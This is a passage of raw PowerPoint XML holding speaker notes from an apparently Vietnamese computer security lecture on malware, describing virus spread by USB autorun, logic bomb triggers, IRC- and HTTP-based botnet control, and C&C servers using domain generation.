                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>tạo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>một bản sao của chính nó hoặc </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>lây nhiễm </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>các loại</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> file</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> phù hợp khác</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>như một virus trên phương tiện di động như ổ USB; nó sau đó thực </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>thi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> khi</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>ổ đĩa được kết nối với một hệ thống khác sử dụng cơ chế tự động chạy bằng</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>khai thác một số lỗ hổng phần mềm hoặc khi người dùng mở tệp bị nhiễm bệnh</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>về hệ thống mục tiêu.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>57</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="168580424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8F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>62</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="82674269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0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>Examples of conditions that can be used as triggers for a logic bomb are the presence or absence of certain files or devices on the system, a particular day of the week</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>or date, a particular version or configuration of some software, or a particular user</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>running the application. Once triggered, a bomb may alter or delete data or entire files,</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>cause a machine halt, or do some other damage.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{18F9DD13-6400-4570-BF20-5AC29658CEFB}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>67</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="27648770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sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>Phân biệt worm và botAn early means of implementing the remote control facility used an IRC</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>server. All bots join a specific channel on this server and treat incoming messages</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>as commands. More recent botnets tend to avoid IRC mechanisms and use covert</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>communication channels via protocols such as HTTP. Distributed control mechanisms, using peer-to-peer protocols, are also used, to avoid a single point of failure.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>IRC? (Internet Layer Chat): </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>IRC là một dạng liên lạc cấp tốc qua </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" u="none" strike="noStrike" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
                <a:hlinkClick r:id="rId3" tooltip="Mạng"/>
              </a:rPr>
              <a:t>mạng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" u="none" strike="noStrike" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
                <a:hlinkClick r:id="rId4" tooltip="Internet"/>
              </a:rPr>
              <a:t>Internet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>. Nó được thiết kế với mục đích chính là cho phép các nhóm người trong một phòng thảo luận (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="1" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>channel</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>) liên lạc với nhau. Tuy nhiên, nó cũng cho phép hai người dùng liên lạc riêng nếu họ thích.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>Hiện nay IRC là mạng </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" u="none" strike="noStrike" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
                <a:hlinkClick r:id="rId5" tooltip="Nhắn tin nhanh"/>
              </a:rPr>
              <a:t>trò chuyện trực tuyến</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> lớn, có vài triệu kênh trên </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" u="none" strike="noStrike" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
                <a:hlinkClick r:id="rId6" tooltip="Máy chủ"/>
              </a:rPr>
              <a:t>máy phục vụ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> trên khắp thế giới. Giao thức viễn thông này cũ hơn </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" u="none" strike="noStrike" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
                <a:hlinkClick r:id="rId5" tooltip="Nhắn tin nhanh"/>
              </a:rPr>
              <a:t>IM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>Ngoài </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" u="none" strike="noStrike" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
                <a:hlinkClick r:id="rId5" tooltip="Nhắn tin nhanh"/>
              </a:rPr>
              <a:t>tán gẫu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>, IRC còn dùng để chia sẻ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" u="none" strike="noStrike" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
                <a:hlinkClick r:id="rId7" tooltip="Tập tin"/>
              </a:rPr>
              <a:t>tập tin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> và tư liệu theo hình thức </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" u="none" strike="noStrike" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
                <a:hlinkClick r:id="rId8" tooltip="Mạng ngang hàng"/>
              </a:rPr>
              <a:t>mạng ngang hàng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1200" b="0" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" i="0" kern="1200">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
              <a:cs typeface="+mn-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>C&amp;C (Common-and-Control)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1200" i="0" kern="1200">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
              <a:cs typeface="+mn-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>Originally these C&amp;C servers used fixed addresses, which meant they could</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>be located and potentially taken over or removed by law enforcement agencies.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>Some more recent malware families have used techniques such as the automatic</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>generation of very large numbers of server domain names that the malware will try</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>to contact. To defeat this requires security analysts to</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>reverse engineer the name generation algorithm, and to then attempt to gain control over all of the extremely large number of possible domain</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>Another technique</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
